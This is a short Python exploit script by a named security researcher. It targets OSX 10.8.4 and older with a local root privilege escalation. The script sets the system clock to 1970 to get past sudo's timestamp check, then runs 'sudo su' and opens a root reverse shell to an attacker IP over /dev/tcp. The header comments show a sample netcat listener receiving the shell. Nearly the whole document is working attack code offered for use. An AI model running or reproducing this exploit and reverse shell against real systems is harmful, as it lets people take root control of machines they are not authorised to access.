#!/usr/bin/python
 
# Original MSF Module: 
# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/osx/local/sudo_password_bypass.rb
 
###################################################################################################
# Exploit Title: OSX <= 10.8.4 Local Root Priv Escalation Root Reverse Shell
# Date: 08-27-2013
# Exploit Author: David Kennedy @ TrustedSec
# Website: https://www.trustedsec.com
# Twitter: @Dave_ReL1K
# Tested On: OSX 10.8.4
#
# Reference: http://www.exploit-db.com/exploits/27944/
#
# Example below:
# trustedsec:Desktop Dave$ python osx_esc.py 
# [*] Exploit has been performed. You should have a shell on ipaddr: 127.0.0.1 and port 4444
#
# attacker_box:~ Dave$ nc -l 4444
# bash: no job control in this shell
# bash-3.2# 
###################################################################################################
import subprocess
 
# IPADDR for REVERSE SHELL - change this to your attacker IP address
ipaddr = "192.168.1.1"
 
# PORT for REVERSE SHELL - change this to your attacker port address
port = "4444"
 
# drop into a root shell - replace 192.168.1.1 with the reverse listener
proc = subprocess.Popen('bash', shell=False, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
proc.stdin.write("systemsetup -setusingnetworktime Off -settimezone GMT -setdate 01:01:1970 -settime 00:00;sudo su\nbash -i >& /dev/tcp/%s/%s 0>&1 &\n" % (ipaddr,port))
print """
###############################################################
#
# OSX < 10.8.4 Local Root Priv Escalation Root Reverse Shell
#
# Written by: David Kennedy @ TrustedSec
# Website: https://www.trustedsec.com
# Twitter: @Dave_ReL1K
#
# Reference: http://www.exploit-db.com/exploits/27944/
###############################################################
"""
print "[*] Exploit has been performed. You should have a shell on ipaddr: %s and port %s" % (ipaddr,port)